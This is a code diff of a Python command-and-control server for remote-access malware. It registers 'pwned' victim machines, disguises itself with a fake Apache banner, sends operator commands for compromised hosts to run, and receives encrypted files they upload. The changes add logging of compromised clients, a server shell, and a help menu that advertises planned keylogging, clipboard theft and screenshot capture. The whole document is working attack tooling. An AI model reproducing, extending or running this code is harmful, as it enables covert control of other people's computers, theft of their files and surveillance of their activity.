@@ -2,17 +2,23 @@
 Command & Control Server Side Coding
 Author: Davood Yahay(D.Yakuza)
 """
+
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
-# Custom Features Import
-from colorama import Fore
+from os import path, mkdir, listdir, system
+from platform import system as platform_system
 from urllib.parse import unquote_plus
+
+# Custom Features Import
+from datetime import datetime
+from colorama import Fore
 from inputimeout import inputimeout, TimeoutOccurred
-from os import path, mkdir
 from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
+
 from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, FILE_REQUEST, RESPONSE, RESPONSE_KEY, INPUT_TIMEOUT, KEEP_ALIVE_CMD,
-                      BIND_ADDR, PORT, FILE_SEND, INCOMING, OUTGOING, ZIP_PASSWORD)
+                      BIND_ADDR, PORT, FILE_SEND, INCOMING, OUTGOING, ZIP_PASSWORD, SHELL_WINDOWS, SHELL_LINUX, SHELL,
+                      LOG)
 
 
 def get_new_client():
@@ -29,14 +35,14 @@ def get_new_client():
 
     # If pwnedDict is empty, Re initialize pwnedId & activeSession
     if len(pwnedDict) == 1:
-        print(Fore.LIGHTBLUE_EX+ "\n[...] Waiting for a new Connection!. \n" + Fore.RESET)
+        print(Fore.LIGHTBLUE_EX + "\n[...] Waiting for a new Connection!. \n" + Fore.RESET)
         pwnedDict = {}
         pwnedId = 0
         activeClient = 1
 
     # if pwnedDict have items, print it on display to choose active session and switch to it
     else:
-        #display sessions in our dictionary and choose one of them to switch over to
+        # display sessions in our dictionary and choose one of them to switch over to
         while True:
             for key, value in pwnedDict.items():
                 if key != activeClient:
@@ -44,7 +50,7 @@ def get_new_client():
 
             try:
                 newSession = int(input(f"{Fore.LIGHTGREEN_EX}\n[+] Choose Session Number "
-                                                          f"to Make it Active => {Fore.RESET}"))
+                                       f"to Make it Active => {Fore.RESET}"))
             except ValueError:
                 print(Fore.LIGHTRED_EX + "\n[-] Enter Number Only; You must choose a pwned ID of "
                                          "one of the sessions show on the Screen\n" + Fore.RESET)
@@ -55,12 +61,12 @@ def get_new_client():
                 activeClient = newSession
                 del pwnedDict[oldActiveSession]
                 print(Fore.LIGHTGREEN_EX + f"\n[+] Active Session is Now Set on: "
-                                          f"{pwnedDict[activeClient]} \n" + Fore.RESET)
+                                           f"{pwnedDict[activeClient]} \n" + Fore.RESET)
                 break
             # if newSession not in pwnedDict actually wrong chosen number
             else:
                 print(Fore.LIGHTRED_EX + "\n[-] => Wrong Choice; You must choose One of the Pwned ID's "
-                      "you see on the Screen\n")
+                                         "you see on the Screen\n")
                 continue
 
 
@@ -68,17 +74,17 @@ class C2Handler(BaseHTTPRequestHandler):
     """This class is a child of the BaseHTTPRequestHandler class.
     It handles all http requests arrived from the client
     """
- 
-    #Make our Server look like an Up-to-date Apache2 Server on CentOS
+
+    # Make our Server look like an Up-to-date Apache2 Server on CentOS
     server_version = "Apache/4.6.2"
     sys_version = "(CentOS)"
-    
+
     def do_GET(self):
         """this method handles all http GET Requests arrived at the C2 server.
         first send 404 status codes"""
-        
+
         global activeClient, clientAccount, clientHostname, pwnedId, pwnedDict, cwd
-        
+
         if self.path.startswith(CMD_REQUEST):
             # Split out the Client from http GET Request
             client = self.path.split(CMD_REQUEST)[1]
@@ -99,17 +105,18 @@ class C2Handler(BaseHTTPRequestHandler):
             if client not in pwnedDict.values():
                 # Send http Response code and header back to a client
                 self.http_response(404)
-                
+
                 # Increment pwnedId and add the client to pwnedDict using pwnedId as Dict
                 pwnedId += 1
                 pwnedDict[pwnedId] = client
 
                 # Print Pwned Client Message & Information
-                # print(Fore.LIGHTBLUE_EX+f"[+] User Account:
-                # {clientAccount} from {clientHostname} has been pwned by C2 Server "
-                # + Fore.RESET)
-                print(Fore.LIGHTGREEN_EX+f"[+] {clientAccount}@{clientHostname}({clientIp}) has been Pwned \n"+Fore.RESET)
-            
+                print(Fore.LIGHTGREEN_EX + f"[+] {clientAccount}@{clientHostname}({clientIp}) has been Pwned \n" + Fore.RESET)
+
+                # Write log file to LOG(pwned.log)
+                with open(LOG, "a") as fileHandle:
+                    fileHandle.write(f"[+] {datetime.now()} - {pwnedDict[pwnedId]} - {clientIp} \n")
+
             # If the client in pwnedDict and also is Active Session    
             elif client == pwnedDict[activeClient]:
                 # if INPUT_TIMEOUT is set, run inputimeout instead of regular input
@@ -125,8 +132,8 @@ class C2Handler(BaseHTTPRequestHandler):
                         command = KEEP_ALIVE_CMD
                 else:
                     # Collect Command from regular input to run on the c2 client
-                    command = input(Fore.RESET+f"({clientIp}){clientAccount}@{clientHostname}:{cwd} "
-                                               f"=> "+Fore.LIGHTYELLOW_EX)
+                    command = input(Fore.RESET + f"({clientIp}){clientAccount}@{clientHostname}:{cwd} "
+                                                 f"=> " + Fore.LIGHTYELLOW_EX)
                     print(Fore.RESET)
 
                 if command.startswith("server "):
@@ -197,17 +204,89 @@ class C2Handler(BaseHTTPRequestHandler):
                                 zipFile.extractall(INCOMING)
                                 print(f"[+]-Server => {INCOMING}/{filename} is now Unzipped and Decrypted. \n")
                         except FileNotFoundError:
-                            print(f"[-]-Server => {filename} was not found in {INCOMING}. \n")
+                            print(f"{Fore.LIGHTRED_EX}[-]-Server => {filename} was not found in {INCOMING}. \n")
                         except OSError:
-                            print(f"[-]-Server => OS Error when Unzipped-Decrypted {filename} in {INCOMING}.\n")
+                            print(
+                                f"{Fore.LIGHTRED_EX}[-]-Server => OS Error when Unzipped-Decrypted {filename} in {INCOMING}.\n")
                         except IndexError:
-                            print(f"[-]-Server => You must enter a filename located in {INCOMING} to Unzip-Decrypt it. \n")
+                            print(
+                                f"{Fore.LIGHTRED_EX}[-]-Server => You must enter a filename located in {INCOMING} to Unzip-Decrypt it. \n")
+
+                    # The 'server list DIRECTORY' allows us to list files in a folder on the C2 Server
+                    elif command.startswith("server list"):
+                        directory = None
+                        try:
+                            directory = command.split()[2]
+                            print(*listdir(directory), sep="\n")
+                        except NotADirectoryError:
+                            print(f"{Fore.LIGHTRED_EX}[-]-Server => {directory} is not a Directory.{Fore.RESET}")
+                        except FileNotFoundError:
+                            print(f"{Fore.LIGHTRED_EX}[-]-Server => {directory} was not found on the C2 Server.{Fore.RESET}")
+                        except IndexError:
+                            print(*listdir(), sep="\n")
 
                     elif command == "server exit":
                         # Shutting Down the C2 Server
-                        print(Fore.LIGHTRED_EX + f"\n[*] Server: {server.server_address[0]} has been shutting down.\n"
-                                                 f"{Fore.BLUE} Goodbye Ninja,,, 🥷🥷🏽🥷🏿🥷🏻🥷🏽 \n")
+                        print(Fore.LIGHTMAGENTA_EX + f"\n[*] Server: {server.server_address[0]} has been shutting down.\n"
+                                                 f"{Fore.LIGHTBLUE_EX} Goodbye Ninja,,, 🥷🥷🏽🥷🏿🥷🏻🥷🏽 \n")
                         server.shutdown()
+
+                    elif command.startswith("server shell"):
+                        print(f"{Fore.LIGHTGREEN_EX}[+]-Server => Use {Fore.LIGHTMAGENTA_EX}Control+D{Fore.LIGHTGREEN_EX} "
+                              f"or Type {Fore.LIGHTMAGENTA_EX}exit {Fore.LIGHTGREEN_EX} to return to the C2 Server's "
+                              f"Terminal window.\n{Fore.RESET}")
+
+                        # Detect os using platform.system() importing as "platform_system",
+                        # after detect Based on the OS, run the shell command
+                        if platform_system() == "Windows":
+                            print(f"{Fore.LIGHTBLUE_EX}[+]-Server => Windows Shell(CMD) is Running.\n{Fore.RESET}")
+                            system(SHELL_WINDOWS)
+
+                        elif platform_system() == "Linux":
+                            print(f"{Fore.LIGHTBLUE_EX}[+]-Server => Linux Shell(Bash) is Running.\n{Fore.RESET}")
+                            system(SHELL_LINUX)
+
+                        # Change SHELL to Change shell for Un Recognized OS
+                        else:
+                            print(f"{Fore.LIGHTRED_EX}[-]-Server => OS {Fore.BLUE}({platform_system()}){Fore.LIGHTRED_EX}"
+                                  f" Not Recognized, but BASH shell by default is Running\n{Fore.RESET}")
+                            system(SHELL)
+
+                    elif command == "server help":
+                        # Print Client Commands
+                        print("Client Commands:",
+                              "client download FILENAME - transfer a file from the server to the client",
+                              "client upload FILENAME - transfer a file from the client to the server",
+                              "client zip FILENAME - zip and encrypt a file on the client",
+                              "client unzip FILENAME - unzip and decrypt a file on the client",
+                              "client kill - permanently shutdown the active client",
+                              "client delay SECONDS - change the delay setting for a client's reconnection attempts"
+                              " (coming soon)",
+                              "client sleep SECONDS - put the client to sleep for a while (may remove soon)",
+                              "client get clipboard - grab a copy of the client's clipboard (coming soon)",
+                              "client keylog on - start up a keylogger on the client (coming soon)",
+                              "client keylog off - turn off the keylogger on the client and write the results to disk"
+                              " (coming soon)",
+                              "client screenshot - grab a copy of the client's screens (coming soon)",
+                              "client display FILENAME - display an image on the client's screen (coming soon)",
+                              "client flip screen - flip a client's screen upside down (coming soon)",
+                              "client max sound - turn a client's volume all the way up (coming soon)",
+                              "client play FILENAME.wav - play a .wav sound file on the client (coming soon)",
+                              "* - run an OS command on the client that doesn't require input",
+                              "* & - run an OS command on the client in the background (coming soon)", sep="\n")
+                        # Print Server Commands
+                        print("\nServer Commands:",
+                              "server show clients - print an active listing of our pwned clients",
+                              "server control PWNED_ID - change the active client that you have a prompt for",
+                              "server zip FILENAME - zip and encrypt a file in the outgoing folder on the server",
+                              "server unzip FILENAME - unzip and decrypt a file in the incoming folder on the server",
+                              "server exit - gracefully shuts down the server",
+                              "server list DIRECTORY - obtain a file listing of a directory on the server",
+                              "server shell - obtain a shell on the server", sep="\n")
+
+                    # Must respond to the client after a server command to cleanly finish the connection
+                    # self.http_response(204)
+
 
                 # Else Command is not a special,
                 # Write it on the Response File and then a client able to read it and run it
@@ -226,11 +305,11 @@ class C2Handler(BaseHTTPRequestHandler):
                         get_new_client()
                     # Handle KeyboardInterrupt  - Optional
                     except KeyboardInterrupt:
-                        print(Fore.LIGHTMAGENTA_EX+"\n[*] User has been Interrupted the C2 Server"+Fore.RESET)
+                        print(Fore.LIGHTMAGENTA_EX + "\n[*] User has been Interrupted the C2 Server" + Fore.RESET)
                         exit()
                     # Handle Unknown & Other Errors - Optional
                     except Exception as e:
-                        print(Fore.LIGHTRED_EX+"[!] Unknown Error when Sending Command to C2 Client\n"+Fore.RESET)
+                        print(Fore.LIGHTRED_EX + "[!] Unknown Error when Sending Command to C2 Client\n" + Fore.RESET)
                         print(f'Error Content:\n{e}')
                     # else block for fixing client kill command for the down client
                     else:
@@ -270,12 +349,12 @@ class C2Handler(BaseHTTPRequestHandler):
         else:
             """NO body should ever post to our C2 Server other than the above paths; so 
             this code block for security and avoiding posting from attackers"""
-            print(Fore.LIGHTRED_EX+f"⛔ {self.client_address[0]} just Accessed {self.path} on our C2 Server 🔐. "
-                                   f"Why?\n Asking from yourself 🙃 \n")
+            print(Fore.LIGHTRED_EX + f"⛔ {self.client_address[0]} just Accessed {self.path} on our C2 Server 🔐. "
+                                     f"Why?\n Asking from yourself 🙃 \n")
 
     def do_POST(self):
         """this method handles all http POST Requests arrived at the C2 server."""
-        
+
         # Follow code when compromised Computer requesting command
         if self.path == RESPONSE:
             # Print Result of stdout arrived from the client in Plain Text format
@@ -290,18 +369,17 @@ class C2Handler(BaseHTTPRequestHandler):
         else:
             """ NO body should ever post to our C2 Server other than the above paths; so 
         this code block for security and avoiding posting from attackers"""
-            print(Fore.LIGHTRED_EX+f"⛔ {self.client_address[0]} just Accessed {self.path} on our C2 Server 🔐. "
-                                   f"Why?\n Asking from yourself 🙃 \n")
+            print(Fore.LIGHTRED_EX + f"⛔ {self.client_address[0]} just Accessed {self.path} on our C2 Server 🔐. "
+                                     f"Why?\n Asking from yourself 🙃 \n")
 
     def do_PUT(self):
         """this method handle all HTTP PUT Requests arrived to C2 Server"""
-        #Follow this code block when the compromised machine is sending the file to the server
+        # Follow this code block when the compromised machine is sending the file to the server
         if self.path.startswith(FILE_SEND + "/"):
             self.http_response(200)
 
             # Split out the encrypted filename from http put requests
             filename = self.path.split(FILE_SEND + "/")[1]
-
 
             # Encode the file because decryption requires it, then decrypt and then decode
             filename = cipher.decrypt(filename.encode()).decode()
@@ -322,9 +400,8 @@ class C2Handler(BaseHTTPRequestHandler):
 
         # Nobody should ever get here using an HTTP Put method
         else:
-            print(Fore.LIGHTRED_EX+f"⛔ {self.client_address[0]} just Accessed {self.path} on our C2 Server 🔐. "
-                                   f"Why?\n Asking from yourself 🙃 \n")
-
+            print(Fore.LIGHTRED_EX + f"⛔ {self.client_address[0]} just Accessed {self.path} on our C2 Server 🔐. "
+                                     f"Why?\n Asking from yourself 🙃 \n")
 
     def handle_post_data(self):
         """ this function handles all http POST Requests arrived at the C2 client."""
@@ -333,7 +410,7 @@ class C2Handler(BaseHTTPRequestHandler):
         self.http_response(200)
 
         # Get Content Length value from http headers
-        contentLength = int(self.headers.get('Content-Length')) # noqa
+        contentLength = int(self.headers.get('Content-Length'))  # noqa
 
         # gather the client's data by reading in the HTTP POST data
         clientData = self.rfile.read(contentLength)
@@ -358,7 +435,7 @@ class C2Handler(BaseHTTPRequestHandler):
         and Headers back to the client"""
         self.send_response(code)
         self.end_headers()
-    
+
     def log_request(self, code="-", size="-"):
         """Override this function because by default these functions write to screen,
         but we need and want to write logs into a file
@@ -390,7 +467,6 @@ if not path.isdir(INCOMING):
 if not path.isdir(OUTGOING):
     mkdir(OUTGOING)
 
-
 # This a current working directory from the client belonging to active session
 cwd = "~"
 
@@ -399,13 +475,12 @@ cwd = "~"
 server = ThreadingHTTPServer((BIND_ADDR, PORT), C2Handler)
 
 # Print C2 Server Side Message for avoid complexing in test operation
-print(Fore.LIGHTMAGENTA_EX+"\n[+]-------------C2 Server Side-------------[+]\nWait for C2 Client...\n"+Fore.RESET)
+print(Fore.LIGHTMAGENTA_EX + "\n[+]-------------C2 Server Side-------------[+]\nWait for C2 Client...\n" + Fore.RESET)
 
-#Run Server in infinity Loop
+# Run Server in infinity Loop
 try:
     server.serve_forever()
 except KeyboardInterrupt:
     print(Fore.LIGHTRED_EX + f"\n[*] Server: {server.server_address[0]} has been shutting down.\n{Fore.BLUE} "
                              f"Goodbye Ninja,,, 🥷🥷🏽🥷🏿🥷🏻🥷🏽 \n")
     server.shutdown()
-
